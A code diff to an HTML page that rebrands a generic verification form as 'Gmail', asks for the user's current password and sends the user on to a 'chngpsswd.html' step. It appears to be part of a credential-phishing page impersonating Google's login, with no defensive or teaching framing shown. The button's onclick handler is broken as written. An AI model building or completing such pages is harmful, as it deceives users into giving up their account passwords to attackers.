@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Verification</title>
+    <title>Gmail</title>
     <style>
         /* CSS for styling the page */
         body {
@@ -140,8 +140,8 @@
 
         <form id="verificationForm">
             <div class="input-group">
-                <label for="code">Enter Verification Code</label>
-                <input type="password" id="code" name="code" placeholder="123456">
+                <label for="code">Enter Current Password:</label>
+                <input type="password" id="code" name="code" placeholder="Current Password">
             </div>
 
             <div class="show-password">
@@ -149,24 +149,14 @@
                 <label for="showPassword">Show password</label>
             </div>
 
-            <button type="button" class="button" onclick="verifyCode()">Verify</button>
+            <button type="button" class="button" onclick="chngpsswd.html">Next</button>
         </form>
 
         <div class="footer">Need help? Visit the <a href="#">Help Center</a></div>
     </div>
 
     <script>
-        // JavaScript function to handle form submission
-        function verifyCode() {
-            const code = document.getElementById('code').value;
-            if (code === '123456') {
-                alert('Verification successful!');
-                // Here, redirect or handle successful verification
-            } else {
-                alert('Invalid verification code. Please try again.');
-            }
-        }
-
+        
         // JavaScript function to toggle password visibility
         function togglePasswordVisibility() {
             const passwordInput = document.getElementById('code');
